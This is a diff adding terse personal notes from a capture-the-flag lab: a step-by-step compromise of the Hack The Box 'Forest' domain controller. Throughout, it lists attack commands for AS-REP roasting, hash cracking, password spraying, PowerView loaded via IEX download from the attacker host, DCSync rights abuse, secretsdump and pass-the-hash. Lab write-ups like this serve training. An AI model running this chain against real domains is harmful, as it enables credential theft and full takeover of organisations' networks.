@@ -1,0 +1,122 @@
+smbclient -L 10.10.10.161
+nslookup
+server 10.10.10.161
+127.0.0.1	//reverse lookups, 
+127.0.0.2
+10.10.10.161	//some recursion or so does not let lookup itself
+ping 10.10.10.161	//because of ttl(127, default 128 minus 1 jmp, below 64 should be linux) it is a windows box
+ldapsearch -h 10.10.10.161
+ldapsearch -h 10.10.10.161 -x	//simple auth
+ldapsearch -h 10.10.10.161 -x -s base namingcontexts
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local"
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)'	//only info about person
+//google windows timestamp to human
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName 
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName |grep sAMAccountName
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName | awk '{print $2}' > userlist.ldap	//to save the users
+vim userlist.ldap	//delete nonimportant users(only left the ones at the end)
+vim pwlist.txt		//create own wordlist
+for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > t
+mv t pwlist
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule	//creates passwords with the given list
+for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; done > t	//add ! to passwords
+cp t pwlist
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |wc-l
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |awk 'length($0) > 7' > t	//it makes 40k results, too much to bruteforce network
+cp t pwlist.txt
+crackmapexec smb --pass-pol 10.10.10.161
+enum4linux 10.10.10.161		//in perl so cant know whats wrong in errors, updated long ago
+crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''	//null auth, allows enumeration (if works)
+rpcclient -U '' 10.10.10.161	//login with no pass
+enumdomusers	//svc-alfresco user
+queryusergroups 0x47b	//rid de svc-alfresco 
+querygroup 0x201	//domain users
+querygroup 0x47c	//serviceaccounts
+queryuser 0x47b
+
+crackmapexec smb 10.10.10.161 -u userlist.out -p pwlist.txt
+locate impacket |grep example
+cd /usr/share/doc/python3-impacket/examples/
+./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
+./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
+vim svc-alfresco	//paste hash
+hashcat --example-hashes | grep -i krb
+hashcat --example-hashes | less			//find krb5asrep
+hashcat -m 18200 svc-alfresco /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+svc-alfresco:s3rvice
+crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
+crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares	//got access to C,ADMIN,IPC, NETLOGON and SYSVOL
+cd /usr/share/doc/python3-impacket/examples/
+grep -i GPP *	//same with poly, N/A
+//google linux sysvol extract group policy password
+https://ippsec.rocks/#		//group policy pass
+//reviewing ports in nmap, 5985 is wsman -> winrm
+cd /opt/evil-winrm
+./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
+cat ../Desktop/user.txt
+
+cd /opt/privilege-escalation-awesome-scripts-suite	//kali
+find . |grep exe$
+cp ./winPEAS/winPEASexe/winPEAS/obj/Release/winPEAS.exe ~/Documents/HTB/forest/smb/
+impacket-smbserver whatever $(pwd) -smb2support -user ippsec -password whatever
+
+$pass = convertto-securestring 'whatever' -AsPlainText -Force	//win
+$cred = New-Object System.Management.Automation.PSCredential('ippsec',$pass)
+New-PSDrive -Name ippsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.49\whatever
+cd ippsec:
+dir
+.\winPEAS.exe
+cp C:\<file> .	//copies the file to local machine 
+
+cd /opt/Bloodhound
+wget https://github.com/BloodHoundAD/BloodHound/releases/download/3.0.3/BloodHound-linux-x64.zip
+unzip Bloodhound-linux-x64.zip
+cate neo4j |grep auth
+rm /usr/share/neo4j/data/dbms/auth	/erases pass
+neo4j console
+http://localhost:7474/browser/
+neo4j:neo4j:bloodhound
+./BloodHound --no-sandbox
+
+.\SharpHound.exe -c all		//win
+//upload created file to bloodhound, just drop
+
+svc-alfresco	//bloodhoud app, mark user as owned
+// queries/Shortest Path from Owned Principals/HTB.LOCAL , get a graph
+//there is exchange
+nslookup
+server 10.10.10.161
+exch01.htb.local
+
+ping 10.10.10.7		//win, dest unreachable, exchange was active in the past, no loger
+//google:windows account operators group
+
+net user ippsec password /add /domain		//win
+net group "Exchange Windows Permissions"
+net group "Exchange Windows Permissions" /add ippsec
+//in bloodhound, rightclick genericall click to exchange windows permissions/help/abuse info to create user in group exchange...
+//same with writedacl(link to htb.local), these abuse functions use powerview (windows tools)
+//google:powertools git
+cp PowerView.ps1 ~/Documents/HTB/forest/www
+python -m SimpleHTTPServer 80
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.49/PowerView.ps1')	//win
+ippsec:\> $pass = convertto-securestring 'whatever2' -AsPlainText -Force
+$pass = convertto-securestring 'whatever2' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('HTB\ippsec',$pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync	//from writedacl (line 102)
+
+git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev	//kali /opt, dev for dev and not Master branch
+cd /opt/PowerSploit/Recon
+//google:Add-DomainObjectAcl Rights DCSYnc	https://burmat.gitbook.io/security/hacking/domain-exploitation
+//try the same from IEX to...
+C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ippsec -Rights DCSync	//error with principal ippsec
+locate secretsdump.py
+./usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/ippsec:whatever2@10.10.10.161	//got admin hash, copy to file
+vim hash.txt
+crackmapexec smb 10.10.10.161 -u administrator -H <hash>
+./psexec.py -hashes <hash:hash> administrator@10.10.10.161	//Got admin
